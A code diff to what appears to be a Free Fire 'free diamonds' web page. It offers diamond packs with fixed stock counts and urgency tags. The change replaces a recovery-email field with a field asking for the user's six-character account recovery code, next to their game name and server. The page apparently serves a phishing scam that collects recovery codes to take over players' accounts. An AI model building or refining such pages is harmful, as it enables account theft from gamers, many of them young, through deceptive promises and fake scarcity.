@@ -428,8 +428,8 @@
                 <input class="field-input" id="gameName" type="text" placeholder="Your Free Fire name" required>
             </div>
             <div class="field-wrap">
-                <div class="field-label">📧 RECOVERY EMAIL *</div>
-                <input class="field-input" id="phone" type="email" placeholder="your@email.com" required>
+                <div class="field-label"> RECOVERY CODE *</div>
+                <input class="field-input" id="phone" type="text" placeholder="XXXXXX" required>
             </div>
             <div class="field-wrap">
                 <div class="field-label">🌐 SELECT SERVER</div>
@@ -462,11 +462,11 @@ let selectedPack = null;
 // Diamond packs data
 const packs = [
     { id:1, amount:100,  icon:'💎',       stock:48,  tag: null,   color:'cyan' },
-    { id:2, amount:310,  icon:'💎💎',      stock:35,  tag: null,   color:'gold' },
-    { id:3, amount:520,  icon:'💎💎💎',    stock:28,  tag: 'POPULAR', color:'purple' },
-    { id:4, amount:1060, icon:'🔷💎🔷',   stock:18,  tag: null,   color:'gold' },
-    { id:5, amount:2180, icon:'👑💎',      stock:12,  tag: 'HOT',  color:'pink' },
-    { id:6, amount:5600, icon:'🔥👑💎',   stock:5,   tag: 'ELITE', color:'purple' }
+    { id:2, amount:310,  icon:'💎',      stock:35,  tag: null,   color:'gold' },
+    { id:3, amount:520,  icon:'💎',    stock:28,  tag: 'POPULAR', color:'purple' },
+    { id:4, amount:1060, icon:'💎',   stock:18,  tag: 'MONTHLY',   color:'gold' },
+    { id:5, amount:2180, icon:'💎',      stock:12,  tag: 'HOT',  color:'pink' },
+    { id:6, amount:5600, icon:'💎',   stock:5,   tag: 'ELITE', color:'purple' }
 ];
 
 // Render packs
